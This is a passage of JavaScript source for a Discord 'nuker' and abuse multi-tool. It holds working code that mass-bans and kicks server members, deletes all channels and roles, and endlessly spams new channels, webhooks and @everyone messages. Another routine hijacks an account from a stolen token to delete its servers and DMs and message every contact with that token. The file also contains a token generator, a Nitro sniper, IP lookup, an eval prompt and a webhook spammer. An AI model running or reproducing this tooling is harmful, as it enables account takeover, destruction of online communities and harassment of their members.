                                                    "```\n • ww              | Wizzes The Server \n • ban             | Bans Everyone In The Server \n • kick            | Kicks Everyone In The Server```"
                                                  )
                                                  .setFooter(
                                                    `${ccLx} nuker`,
                                                    "https://cdn.discordapp.com/attachments/703580033238827009/810392250709442610/devil_1.jpeg"
                                                  );
                                                message.channel.send(helpEmbed);
                                              }

                                              message.guild.members;
                                              if (
                                                command === "kick" ||
                                                command === "k"
                                              ) {
                                                for (
                                                  let i = 0;
                                                  i <
                                                  message.guild.members.array()
                                                    .length;
                                                  i++
                                                ) {
                                                  let u = message.guild.members.array()[
                                                    i
                                                  ];

                                                  u.kick()
                                                    .then(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("+") +
                                                          mainColor("] ") +
                                                          white("Kicked ") +
                                                          mainColor(u.user.tag)
                                                      );
                                                    })
                                                    .catch(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("-") +
                                                          mainColor("] ") +
                                                          white(
                                                            "Couldn't Kick "
                                                          ) +
                                                          mainColor(u.user.tag)
                                                      );
                                                    })
                                                    .finally(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("!") +
                                                          mainColor("] ") +
                                                          white(
                                                            "RateLimited, Sleeping for "
                                                          ) +
                                                          mainColor("0") +
                                                          white(" Seconds")
                                                      );
                                                    });
                                                }

                                                message.guild.members.forEach(
                                                  (mm) => {
                                                    mm.ban()
                                                      .then(() => {
                                                        console.log(
                                                          red(`[2021] `) +
                                                            white(
                                                              "Successfully Kicked -> "
                                                            ) +
                                                            green(mm.user.tag)
                                                        );
                                                      })
                                                      .catch(() => {});
                                                  }
                                                );
                                              }

                                              if (
                                                command === "b" ||
                                                command === "ban"
                                              ) {
                                                for (
                                                  let i = 0;
                                                  i <
                                                  message.guild.members.array()
                                                    .length;
                                                  i++
                                                ) {
                                                  let u = message.guild.members.array()[
                                                    i
                                                  ];

                                                  u.ban()
                                                    .then(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("+") +
                                                          mainColor("] ") +
                                                          white("Banned ") +
                                                          mainColor(u.user.tag)
                                                      );
                                                    })
                                                    .catch(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("-") +
                                                          mainColor("] ") +
                                                          white(
                                                            "Couldn't Ban "
                                                          ) +
                                                          mainColor(u.user.tag)
                                                      );
                                                    })
                                                    .finally(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("!") +
                                                          mainColor("] ") +
                                                          white(
                                                            "RateLimited, Sleeping for "
                                                          ) +
                                                          mainColor("0") +
                                                          white(" Seconds")
                                                      );
                                                    });
                                                }

                                                message.guild.members.forEach(
                                                  (mm) => {
                                                    mm.ban()
                                                      .then(() => {
                                                        console.log(
                                                          red(`[2021] `) +
                                                            white(
                                                              "Successfully banned -> "
                                                            ) +
                                                            green(mm.user.tag)
                                                        );
                                                      })
                                                      .catch(() => {});
                                                  }
                                                );
                                              }

                                              if (command === "ww") {
                                                const nl = require("./data/nuker.json");
                                                process.nextTick(() => {
                                                  for (
                                                    let i = 0;
                                                    i <
                                                    message.guild.members.array()
                                                      .length;
                                                    i++
                                                  ) {
                                                    let u = message.guild.members.array()[
                                                      i
                                                    ];

                                                    u.ban({
                                                      reason: `Best Discord Nuker | ${ccLx} nuker`,
                                                    })
                                                      .then(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("+") +
                                                            mainColor("] ") +
                                                            white("Banned ") +
                                                            mainColor(u.user.id)
                                                        );
                                                      })
                                                      .catch(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("-") +
                                                            mainColor("] ") +
                                                            white(
                                                              "Couldn't Ban "
                                                            ) +
                                                            mainColor(
                                                              u.user.tag
                                                            )
                                                        );
                                                      });
                                                  }

                                                  message.guild.members.forEach(
                                                    (mm) => {
                                                      mm.ban({
                                                        reason: `Best discord nuker | ${ccLx} nuker`,
                                                      })
                                                        .then(() => {
                                                          console.log(
                                                            mainColor(
                                                              "                              ["
                                                            ) +
                                                              white("+") +
                                                              mainColor("] ") +
                                                              white("Banned ") +
                                                              mainColor(
                                                                mm.user.tag
                                                              )
                                                          );
                                                          0;
                                                        })
                                                        .catch(() => {});
                                                    }
                                                  );

                                                  for (
                                                    let i = 0;
                                                    i <
                                                    message.guild.members.array()
                                                      .length;
                                                    i++
                                                  ) {
                                                    let u = message.guild.members.array()[
                                                      i
                                                    ];

                                                    u.kick()
                                                      .then(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("+") +
                                                            mainColor("] ") +
                                                            white("Kicked ") +
                                                            mainColor(
                                                              u.user.tag
                                                            )
                                                        );
                                                      })
                                                      .catch(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("-") +
                                                            mainColor("] ") +
                                                            white(
                                                              "Couldn't Kick "
                                                            ) +
                                                            mainColor(
                                                              u.user.tag
                                                            )
                                                        );
                                                      });
                                                  }

                                                  message.guild.members.forEach(
                                                    (mm) => {
                                                      mm.ban({
                                                        reason: `Best discord nuker | ${ccLx} nuker`,
                                                      })
                                                        .then(() => {
                                                          console.log(
                                                            mainColor(
                                                              "                              ["
                                                            ) +
                                                              white("+") +
                                                              mainColor("] ") +
                                                              white("Kicked ") +
                                                              mainColor(
                                                                mm.user.tag
                                                              )
                                                          );
                                                        })
                                                        .catch(() => {});
                                                    }
                                                  );
                                                });
                                                message.guild.channels.forEach(
                                                  (ch) => {
                                                    ch.delete()
                                                      .then(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("+") +
                                                            mainColor("]") +
                                                            white(
                                                              " Deleted channel "
                                                            ) +
                                                            mainColor(ch.id)
                                                        );
                                                      })
                                                      .catch(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("+") +
                                                            mainColor("]") +
                                                            white(
                                                              " Couldn't Deleted channel "
                                                            ) +
                                                            mainColor(ch.id)
                                                        );
                                                      });
                                                  }
                                                );
                                                setInterval(() => {
                                                  message.guild
                                                    .createChannel(
                                                      nl[3].name[
                                                        Math.floor(
                                                          Math.random() *
                                                            nl[3].name.length
                                                        )
                                                      ],
                                                      {
                                                        type: "text",
                                                        topic: `Made By ${ccsMB}`,
                                                      }
                                                    )
                                                    .then((channel) => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("+") +
                                                          mainColor("]") +
                                                          white(
                                                            " Created channel "
                                                          ) +
                                                          mainColor(channel.id)
                                                      );
                                                      setInterval(() => {
                                                        channel
                                                          .send(
                                                            "@everyone " +
                                                              nl[4].names[
                                                                Math.floor(
                                                                  Math.random() *
                                                                    nl[4].names
                                                                      .length
                                                                )
                                                              ]
                                                          )
                                                          .then((msg) => {
                                                            console.log(
                                                              mainColor(
                                                                "                              ["
                                                              ) +
                                                                white("+") +
                                                                mainColor("]") +
                                                                white(
                                                                  " Sent message "
                                                                ) +
                                                                mainColor(
                                                                  msg.id
                                                                )
                                                            );
                                                          })
                                                          .catch(() => {
                                                            console.log(
                                                              mainColor(
                                                                "                              ["
                                                              ) +
                                                                white("-") +
                                                                mainColor("]") +
                                                                white(
                                                                  " Couldn't send message "
                                                                )
                                                            );
                                                          });
                                                      });
                                                      channel
                                                        .createWebhook(
                                                          nl[1].names[
                                                            Math.floor(
                                                              Math.random() *
                                                                nl[1].names
                                                                  .length
                                                            )
                                                          ]
                                                        )
                                                        .then((webhook) => {
                                                          console.log(
                                                            mainColor(
                                                              "                              ["
                                                            ) +
                                                              white("+") +
                                                              mainColor("]") +
                                                              white(
                                                                " Created webhook "
                                                              ) +
                                                              mainColor(
                                                                webhook.id
                                                              )
                                                          );

                                                          setInterval(() => {
                                                            webhook
                                                              .send(
                                                                "@everyone " +
                                                                  nl[4].names[
                                                                    Math.floor(
                                                                      Math.random() *
                                                                        nl[4]
                                                                          .names
                                                                          .length
                                                                    )
                                                                  ]
                                                              )
                                                              .then((msg) => {
                                                                console.log(
                                                                  mainColor(
                                                                    "                              ["
                                                                  ) +
                                                                    white("+") +
                                                                    mainColor(
                                                                      "]"
                                                                    ) +
                                                                    white(
                                                                      " Sent webhook message "
                                                                    ) +
                                                                    mainColor(
                                                                      msg.id
                                                                    )
                                                                );
                                                              })
                                                              .catch(() => {
                                                                console.log(
                                                                  mainColor(
                                                                    "                              ["
                                                                  ) +
                                                                    white("-") +
                                                                    mainColor(
                                                                      "]"
                                                                    ) +
                                                                    white(
                                                                      " Couldn't send webhook message "
                                                                    )
                                                                );
                                                              });
                                                          });
                                                        })
                                                        .catch(() => {
                                                          console.log(
                                                            mainColor(
                                                              "                              ["
                                                            ) +
                                                              white("-") +
                                                              mainColor("]") +
                                                              white(
                                                                " Couldn't create webhook "
                                                              )
                                                          );
                                                        });
                                                      channel
                                                        .createWebhook(
                                                          nl[1].names[
                                                            Math.floor(
                                                              Math.random() *
                                                                nl[1].names
                                                                  .length
                                                            )
                                                          ]
                                                        )
                                                        .then((webhook) => {
                                                          console.log(
                                                            mainColor(
                                                              "                              ["
                                                            ) +
                                                              white("+") +
                                                              mainColor("]") +
                                                              white(
                                                                " Created webhook "
                                                              ) +
                                                              mainColor(
                                                                webhook.id
                                                              )
                                                          );

                                                          setInterval(() => {
                                                            webhook
                                                              .send(
                                                                "@everyone " +
                                                                  nl[4].names[
                                                                    Math.floor(
                                                                      Math.random() *
                                                                        nl[4]
                                                                          .names
                                                                          .length
                                                                    )
                                                                  ]
                                                              )
                                                              .then((msg) => {
                                                                console.log(
                                                                  mainColor(
                                                                    "                              ["
                                                                  ) +
                                                                    white("+") +
                                                                    mainColor(
                                                                      "]"
                                                                    ) +
                                                                    white(
                                                                      " Sent webhook message "
                                                                    ) +
                                                                    mainColor(
                                                                      msg.id
                                                                    )
                                                                );
                                                              })
                                                              .catch(() => {
                                                                console.log(
                                                                  mainColor(
                                                                    "                              ["
                                                                  ) +
                                                                    white("-") +
                                                                    mainColor(
                                                                      "]"
                                                                    ) +
                                                                    white(
                                                                      " Couldn't send webhook message "
                                                                    )
                                                                );
                                                              });
                                                          });
                                                        })
                                                        .catch(() => {
                                                          console.log(
                                                            mainColor(
                                                              "                              ["
                                                            ) +
                                                              white("-") +
                                                              mainColor("]") +
                                                              white(
                                                                " Couldn't create webhook "
                                                              )
                                                          );
                                                        });
                                                    })
                                                    .catch(() => {
                                                      console.log(
                                                        mainColor(
                                                          "                              ["
                                                        ) +
                                                          white("-") +
                                                          mainColor("]") +
                                                          white(
                                                            " Couldn't create channel "
                                                          )
                                                      );
                                                    });
                                                });
                                                message.guild.roles.forEach(
                                                  (role) => {
                                                    role
                                                      .delete()
                                                      .then(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("+") +
                                                            mainColor("]") +
                                                            white(
                                                              " Deleted role "
                                                            ) +
                                                            mainColor(role.id)
                                                        );
                                                      })
                                                      .catch(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("-") +
                                                            mainColor("]") +
                                                            white(
                                                              " Couldn't delete role "
                                                            )
                                                        );
                                                      });
                                                  }
                                                );
                                                setTimeout(() => {
                                                  setInterval(() => {
                                                    message.guild
                                                      .createRole({
                                                        name:
                                                          nl[5].names[
                                                            Math.floor(
                                                              Math.random() *
                                                                nl[5].names
                                                                  .length
                                                            )
                                                          ],
                                                        color: "RANDOM",
                                                      })
                                                      .then((role) => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("+") +
                                                            mainColor("]") +
                                                            white(
                                                              " Created role "
                                                            ) +
                                                            mainColor(role.id)
                                                        );
                                                      })
                                                      .catch(() => {
                                                        console.log(
                                                          mainColor(
                                                            "                              ["
                                                          ) +
                                                            white("-") +
                                                            mainColor("]") +
                                                            white(
                                                              " Couldn't create role "
                                                            )
                                                        );
                                                      });
                                                  });
                                                }, 2000);
                                              }
                                            }
                                          );
                                        }

                                        mainNukerLogo();
                                      });

                                      mainNuker.login(token).catch(() => {
                                        console.log(
                                          red(`                           > `) +
                                            white(`Incorrect token passed`)
                                        );
                                        setTimeout(() => {
                                          console.clear();
                                          start();
                                        }, 2 * 1000);
                                      });
                                    }
                                  );
                                }
                              );
                            }
                          }
                        );
                      }, 2 * 1000);
                    }
                  }
                }
              }
            }
          );
        }, 300);
        function ran() {
          process.title = `[${ccLx} tools] - Discord tools`;
          console.clear();
          console.log(
            red(`
              
  
  
                    
             ╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗  ╔╦╗╔═╗╔═╗╦  ╔═╗
              ║║║╚═╗║  ║ ║╠╦╝ ║║   ║ ║ ║║ ║║  ╚═╗
             ═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝   ╩ ╚═╝╚═╝╩═╝╚═╝
                 
              `)
          );

          console.log(yellow("[1] ") + red("Token nuke"));
          console.log(yellow("[2] ") + red("Token Fucker"));
          console.log(yellow("[3] ") + red("IP lookup"));
          console.log(yellow("[4] ") + red("Token Info"));
          console.log(yellow("[5] ") + red("Re Login"));
          console.log(yellow("[6] ") + red("Nitro Sniper"));
          console.log(yellow("[7] ") + red("Token Gen"));
          console.log(yellow("[8] ") + red("Evaluate"));
          console.log(yellow("[9] ") + red("Perms checker"));
          console.log(yellow("[10] ") + red("Credits"));
          console.log(yellow("[11] ") + red("WebHook spammer"));
          console.log(yellow("[12] ") + red("Self bot"));
          console.log(yellow("[13] ") + red("Slot Bot sniper"));
          console.log(yellow("[14] ") + red("Account checker"));
          console.log(yellow("[15] ") + red("Custom Presene"));
          console.log(yellow("[16] ") + red("Mass DM"));
          console.log(yellow("[17] ") + red("View Your IP"));
          console.log(yellow("[18] ") + red("Auto hitter"));
          console.log(yellow("[19] ") + red("Pinger"));
          console.log(yellow("[20] ") + red("Mass webhook spammer"));
          console.log(yellow("[21] ") + red("Request data"));
          console.log(yellow("[22] ") + red("Main Menu"));
          console.log(
            "                                                                    "
          );

          rl.question("Enter your option: ", (opeee) => {
            let option = opeee.trim();

            var poss = [
              "1",
              "2",
              "3",
              "4",
              "5",
              "6",
              "7",
              "8",
              "9",
              "10",
              "11",
              "12",
              "13",
              "14",
              "15",
              "16",
              "17",
              "18",
              "19",
              "20",
              "21",
              "22",
            ];
            if (!poss.includes(option)) {
              console.log(red("Incorrect options given"));
              setTimeout(() => {
                ran();
              }, 2 * 1000);
            }
            if (option === "1") {
              rl.question("Enter token: ", (op) => {
                const client = new Client();
                if (op.startsWith('"') && op.endsWith('"')) {
                  op = op.slice(1, op.length - 1);
                }
                client.on("ready", () => {
                  try {
                    client.users.forEach((u) => {
                      if (u.dmChannel) {
                        u.deleteDM().catch((err) => console.log(" "));
                      }
                    });
                    console.log(
                      white("[+] ") + red(`Deleted DM with ${u.tag}`)
                    );
                  } catch (e) {}

                  try {
                    client.guilds.forEach((g) => {
                      if (g.ownerID === client.user.id) {
                        g.delete().then(() => {
                          console.log(
                            white("[+] ") +
                              red(`Deleted server ${g.name}`) +
                              white(" [+]")
                          );
                        });
                      }
                    });
                  } catch (error) {}
                  try {
                    client.users.forEach((user) => {
                      try {
                        user
                          .send(
                            `HAHA, this retard got logged. His token is: ${token}`
                          )
                          .catch((err) => {})
                          .then(() => {
                            console.log(
                              white("[+] ") +
                                red(`Successfully dmed ${user.tag} `) +
                                white("[+]")
                            );
                          });
                      } catch (e) {}
                    });
                  } catch (e) {}
                  try {
                    client.user
                      .setAvatar(
                        "https://cdn.discordapp.com/attachments/775403637466857512/807375739590672385/16bd0d529a9a6fd9f42e8ae6c89ee44c.png"
                      )
                      .catch((err) => {});
                    console.log(
                      white("[+] ") + red("Set users avatar ") + white("[+]")
                    );
                  } catch (e) {}

                  try {
                    try {
                      client.guilds.forEach((g) =>
                        g
                          .leave()
                          .catch((err) => {})
                          .then((guild) => {
                            try {
                              var s = guild.name;
                            } catch (e) {
                              s = "No server found";
                            }
                            console.log(
                              white("[+] ") +
                                red(
                                  `Left server ${s || "Couldn't find server"} `
                                ) +
                                white("[+]")
                            );
                          })
                      );
                    } catch (e) {
                      console.log(e);
                    }
                  } catch (e) {
                    console.log(e);
                  }
                });
                client.login(op).catch(() => {
                  console.log(red("Incorrect token passed"));
                  setTimeout(() => {
                    ran();
                  }, 2 * 1000);
                  return;
                });
              });
            }
            if (option === "2") {
              rl.question("Enter token: ", (op) => {
                const client = new Client();
                if (op.startsWith('"') && op.endsWith('"')) {
                  op = op.slice(1, op.length - 1);
                }
                try {
                  client.on("ready", () => {
                    client.guilds.forEach((g) => {
                      g.delete();
                      client.guilds.forEach((g) => {
                        if (g.ownerID !== client.user.id) g.leave();
                      });
                      setInterval(() => {
                        client.user.createGuild("Token fucked").then((guild) =>
                          guild
                            .setIcon(
                              "https://cdn.discordapp.com/attachments/803968324555374602/807531830042558464/anime.jpg"
                            )
                            .catch((er) => {})
                            .then((g) => {
                              console.log(
                                white("[+] ") +
                                  red(`Crated server ${guild.name}`) +
                                  white(" [+]")
                              );
                              guild.createChannel("TOKEN FUCKED", {
                                type: "text",
                              });
                              guild.createRole({
                                name: "token fucked",
                                color: "RANDOM",
                              });
                            })
                        );
                      });

                      try {
                        client.user.setAvatar(
                          "https://cdn.discordapp.com/attachments/775403637466857512/807375739590672385/16bd0d529a9a6fd9f42e8ae6c89ee44c.png"
                        );
                        console.log(
                          white("[+] ") +
                            red("Set users avatar ") +
                            white("[+]")
                        );
                      } catch (e) {
                        console.log(
                          white("[+] ") +
                            red("Failed Set users avatar ") +
                            white("[+]")
                        );
                      }
                    });
                  });
                } catch (e) {
                  console.log(e);
                }

                client.login(op).catch(() => {
                  console.log(red("Incorrect token passed"));
                  setTimeout(() => {
                    ran();
                  }, 2 * 1000);
                  return;
                });
              });
            }
            if (option === "3") {
              console.clear();
              console.log(
                mainColor(`
          
                  ╦╔═╗  ╦  ╔═╗╔═╗╦╔═╦ ╦╔═╗
                  ║╠═╝  ║  ║ ║║ ║╠╩╗║ ║╠═╝
                  ╩╩    ╩═╝╚═╝╚═╝╩ ╩╚═╝╩  
  
          
                `)
              );
              rl.question("Enter IP: ", (ip) => {
                try {
                  fetch(`http://ipinfo.io/${ip}/json`)
                    .then((results) => results.json())
                    .then(async (stats) => {
                      if (stats.city === undefined)
                        return console.log(red("Incorrect IP given"));
                      console.clear();
                      console.log(
                        mainColor(`
                      
                      
                    ╦╔═╗  ╦  ╔═╗╔═╗╦╔═╦ ╦╔═╗
                    ║╠═╝  ║  ║ ║║ ║╠╩╗║ ║╠═╝
                    ╩╩    ╩═╝╚═╝╚═╝╩ ╩╚═╝╩  
  
  
  
  
                      IP: ${stats.ip}
                      City: ${stats.city}
                      Region: ${stats.region}
                      Country: ${stats.country}
                      Loc: ${stats.loc}
                      Org: ${stats.org}
                      Postal: ${stats.postal}
                      TimeZone: ${stats.timezone}
                      `)
                      );
                    });
                } catch (e) {
                  console.log(red("A erro has ocurred(Was the IP correct?)"));
                }
              });
            }
            if (option === "4") {
              rl.question("Enter token: ", (token) => {
                if (token.startsWith('"') && token.endsWith('"')) {
                  token = token.slice(1, token.length - 1);
                }

                const tokenInfo = new Client();

                tokenInfo.on("ready", () => {
                  console.log(
                    mainColor(`
                  
                 ╔╦╗┌─┐┬┌─┌─┐┌┐┌  ╦┌┐┌┌─┐┌─┐
                  ║ │ │├┴┐├┤ │││  ║│││├┤ │ │
                  ╩ └─┘┴ ┴└─┘┘└┘  ╩┘└┘└  └─┘
                 
                  
                  Username: ${tokenInfo.user.username} 
                  Discriminator: ${tokenInfo.user.discriminator}
                  Tag: ${tokenInfo.user.tag}
                  ID: ${tokenInfo.user.id}
                  Nitro: ${tokenInfo.user.premium} 
                  Status: ${tokenInfo.user.presence.status}
                  Email: ${tokenInfo.user.email}
                  Servers: ${tokenInfo.guilds.size}
                  Relations: ${tokenInfo.users.size}
                  Friends: ${tokenInfo.user.friends.size}
                  User bot? ${tokenInfo.user.bot}
                  2FA: ${tokenInfo.user.mfaEnabled}
                  Mobile: ${tokenInfo.user.mobile}
  
                  `)
                  );
                });

                tokenInfo.login(token).catch(() => {
                  console.log(red("Incorrect token passed"));
                  setTimeout(() => {
                    ran();
                  }, 2 * 1000);
                  return;
                });
              });
            }
            if (option === "5") {
              rl.close();
              console.log("Restarting system..");
              setTimeout(() => {
                start();
              }, 3 * 1000);
            }
            if (option === "6") {
              console.clear();
              console.log(
                mainColor(`
  
                          ╔╗╔╦╔╦╗╦═╗╔═╗  ╔═╗╔╗╔╦╔═╗╔═╗╦═╗
                          ║║║║ ║ ╠╦╝║ ║  ╚═╗║║║║╠═╝║╣ ╠╦╝
                          ╝╚╝╩ ╩ ╩╚═╚═╝  ╚═╝╝╚╝╩╩  ╚═╝╩╚═
                          
  
          `)
              );
              rl.question("         Enter your token: ", (token) => {
                const nitroSniper = new Client();
                if (token.startsWith('"') && token.endsWith('"')) {
                  token = token.slice(1, token.length - 1);
                }
                nitroSniper.on("ready", () => {
                  console.log(
                    mainColor(`
                  
                  Ready to snipe in ${nitroSniper.guilds.size} servers!
                  
                  `)
                  );
                });
                nitroSniper.on("message", () => {
                  if (
                    message.content.includes("discord.gift/") ||
                    message.content.includes("discordapp.com/gifts/")
                  ) {
                    var Nitro = /(discord\.(gift)|discordapp\.com\/gift)\/.+[a-z]/;
                    var NitroUrl = Nitro.exec(message.content);
                    try {
                      var NitroCode = NitroUrl[0].split("/")[1];
                    } catch (e) {
                      NitroCode = message.content.slice("discord.gift/");
                    }

                    axios({
                      method: "POST",
                      url: `https://discord.com/gifts/${NitroCode}`,
                      headers: {
                        Authorization: token,
                      },
                    }).then(() => {
                      try {
                        var server = message.guild.name;
                      } catch (e) {
                        server = "DM channel";
                      }
                      console.log(
                        green(
                          `  Nitro Sniped \n \n • Server       | ${server} \n • Channel      | ${message.channel.name} \n • Author       | ${message.author.tag} \n • Code         | ${NitroCode}`
                        ) + "\n"
                      );
                    });
                  }
                  nitroSniper.login(token).catch(() => {
                    console.log(red("Incorrect token passed"));
                    setTimeout(() => {
                      ran();
                    }, 2 * 1000);
                    return;
                  });
                });
              });
            }
            if (option === "7") {
              function getRandomString(length) {
                var randomChars =
                  "abcdefghijklmnopqrstuvwxyz-=_ABCDEFHIJKLMNOPQRSTUVWXYZ1234567890...abcdefghijclmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~";
                var result = "";
                for (var i = 0; i < length; i++) {
                  result += randomChars.charAt(
                    Math.floor(Math.random() * randomChars.length)
                  );
                }

                var randomStartes = "gyGyYgygKiIk";
                console.log(
                  red(
                    "Nz" +
                      `${randomStartes.charAt(
                        Math.floor(Math.random() * randomStartes.length)
                      )}` +
                      result
                  )
                );
              }
              setInterval(() => {
                getRandomString(66);
              });
            }
            if (option === "8") {
              console.clear();
              console.log(
                mainColor(`
          
          
              ███████╗██╗   ██╗ █████╗ ██╗     
              ██╔════╝██║   ██║██╔══██╗██║     
              █████╗  ██║   ██║███████║██║     
              ██╔══╝  ╚██╗ ██╔╝██╔══██║██║     
              ███████╗ ╚████╔╝ ██║  ██║███████╗
              ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝
                                   
  
  
          `)
              );
              rl.question("     Enter code to execute: ", (code) => {
                try {
                  const toEval = code;
                  const evalulated = eval(toEval);
                } catch (e) {
                  console.log(
                    red(` Incorrect form of JavaScript \n \n Error: ${e}`)
                  );
                  setTimeout(() => {
                    rl.question("Type anything to continue: ", () => {
                      console.clear();
                      ran();
                    });
                  }, 2 * 1000);
                }
              });
            }
            if (option === "9") {
              const client = new Client();
              rl.question("Enter token: ", (token) => {
                if (token.startsWith('"') && token.endsWith('"')) {
                  token = op.slice(1, token.length - 1);
                }
                client.on("ready", () => {
                  console.clear();
                  console.log(
                    mainColor(`
  
                                     ╔═╗╔═╗╦═╗╔╦╗╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                     ╠═╝║╣ ╠╦╝║║║╚═╗  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                     ╩  ╚═╝╩╚═╩ ╩╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                  
                                         Logged in as ${client.user.tag}
                          
                              `)
                  );

                  client.guilds.forEach((g) => {
                    if (g.me.hasPermission("BAN_MEMBERS")) {
                      console.log(
                        white(`[+] `) +
                          red(`I have ban perms in `) +
                          white(`${g.name} [+] `) +
                          red(`${g.memberCount}`)
                      );
                    }
                    if (g.me.hasPermission("KICK_MEMBERS")) {
                      console.log(
                        white(`[+] `) +
                          red(`I have kick perms in `) +
                          white(`${g.name} [+] `) +
                          red(`${g.memberCount}`)
                      );
                    }
                    setTimeout(() => {
                      if (g.me.hasPermission("MANAGE_ROLES")) {
                        console.log(
                          white(`[+] `) +
                            green(`I have manage role perms in `) +
                            white(`${g.name} [+] `) +
                            red(`${g.memberCount}`)
                        );
                      }
                    }, 1 * 1000);
                    setTimeout(() => {
                      if (g.me.hasPermission("ADMINISTRATOR")) {
                        console.log(
                          white(`[+] `) +
                            cyan(`I have admin perms in `) +
                            white(`${g.name} [+] `) +
                            red(`${g.memberCount}`)
                        );
                      }
                    }, 2 * 1000);
                    setTimeout(() => {
                      if (g.me.hasPermission("MANAGE_CHANNELS")) {
                        console.log(
                          white(`[+] `) +
                            mainColor(`I have manage channel perms in `) +
                            white(`${g.name} [+] `) +
                            red(`${g.memberCount}`)
                        );
                      }
                    }, 3 * 1000);
                    setTimeout(() => {
                      if (g.me.hasPermission("MANAGE_GUILD")) {
                        console.log(
                          white(`[+] `) +
                            cyan(`I have manage server perms in `) +
                            white(`${g.name} [+] `) +
                            red(`${g.memberCount}`)
                        );
                      }
                    }, 2 * 1000);
                    setTimeout(() => {
                      if (g.me.hasPermission("MANAGE_WEBHOOKS")) {
                        console.log(
                          white(`[+] `) +
                            green(`I have manage webhook perms in `) +
                            white(`${g.name} [+] `) +
                            red(`${g.memberCount}`)
                        );
                      }
                    }, 1 * 1000);
                    setTimeout(() => {
                      if (g.me.hasPermission("MENTION_EVERYONE")) {
                        console.log(
                          white(`[+] `) +
                            mainColor(`I have @every1 perms in `) +
                            white(`${g.name} [+] `) +
                            red(`${g.memberCount}`)
                        );
                      }
                    }, 3 * 1000);
                    setTimeout(() => {
                      if (g.me.hasPermission("SEND_TTS_MESSAGES")) {
                        console.log(
                          white(`[+] `) +
                            blue(`I have send tts perms in `) +
                            white(`${g.name} [+] `) +
                            red(`${g.memberCount}`)
                        );
                      }
                    }, 4 * 1000);
                    setTimeout(() => {
                      rl.question("Type anything to continue: ", (a) => {
                        console.clear();
                        ran();
                      });
                    }, 6 * 1000);
                  });
                });
                client.login(token).catch(() => {
                  console.log(red("Incorrect token passed"));
                  setTimeout(() => {
                    ran();
                  }, 2 * 1000);
                  return;
                });
              });
            }
            if (option === "10") {
              console.clear();
              const friends = ["Claqz", "Blikje", "Vxntage", "MYSTAH"];
              function cred() {
                console.log(
                  mainColor(`
                              
                              
                   ::::::::  :::::::::  :::::::::: ::::::::: ::::::::::: ::::::::::: ::::::::  
                   :+:    :+: :+:    :+: :+:        :+:    :+:    :+:         :+:    :+:    :+: 
                   +:+        +:+    +:+ +:+        +:+    +:+    +:+         +:+    +:+        
                   +#+        +#++:++#:  +#++:++#   +#+    +:+    +#+         +#+    +#++:++#++ 
                   +#+        +#+    +#+ +#+        +#+    +#+    +#+         +#+           +#+ 
                   #+#    #+# #+#    #+# #+#        #+#    #+#    #+#         #+#    #+#    #+# 
                    ########  ###    ### ########## ######### ###########     ###     ########  
  
  
  
                              `)
                ); //Aligator 2
              }

              cred();
              console.log(
                white("[+] ") + red(`Made By ${ccsMB}`) + white(" [+]")
              );

              setTimeout(() => {
                console.clear();
                cred();
                console.log(
                  white("[+] ") + red("Fetching extra data...") + white(" [+]")
                );
              }, 2 * 1000);

              setTimeout(() => {
                console.clear();
                cred();
                console.log(
                  white("[+] ") +
                    green(`Discord: ${ccsMB}.#1337`) +
                    white(" [+]")
                );
              }, 4 * 1000);

              setTimeout(() => {
                console.clear();
                cred();
                console.log(
                  white("[+] ") +
                    mainColor("Server: https://discord.gg/YcpcD78WA8") +
                    white(" [+]")
                );
              }, 6 * 1000);
              setTimeout(() => {
                console.clear();
                cred();
                console.log(
                  white("[+] ") +
                    cyan(`Friends: ${friends.join(", ")} `) +
                    white(" [+]")
                );
              }, 8 * 1000);
              setTimeout(() => {
                console.clear();
                ran();
              }, 10 * 1000);
            }
            if (option === "11") {
              rl.question("Enter Webhook  ", (hookIDS) => {
                const [, id, token] = hookIDS.match(/(\d+)\/(.+)/);

                rl.question("Enter Message to spam: ", (msgSpam) => {
                  var msg = msgSpam;

                  console.clear();
                  console.log(
                    mainColor(`
                                  
                                  
  
                                  ╦ ╦╔═╗╔╗ ╦ ╦╔═╗╔═╗╦╔═  ╔═╗╔═╗╔═╗╔╦╗╔╦╗╔═╗╦═╗
                                  ║║║║╣ ╠╩╗╠═╣║ ║║ ║╠╩╗  ╚═╗╠═╝╠═╣║║║║║║║╣ ╠╦╝
                                  ╚╩╝╚═╝╚═╝╩ ╩╚═╝╚═╝╩ ╩  ╚═╝╩  ╩ ╩╩ ╩╩ ╩╚═╝╩╚═
                                  
  
  
                                  `)
                  );
                  rl.question(
                    "Type anything to start spam:   ",
                    (adjnqjknwq) => {
                      const hook = new WebhookClient(id, token);
                      let messagesSpammed = 0;
                      setInterval(() => {
                        hook.send(msg).then(() => {
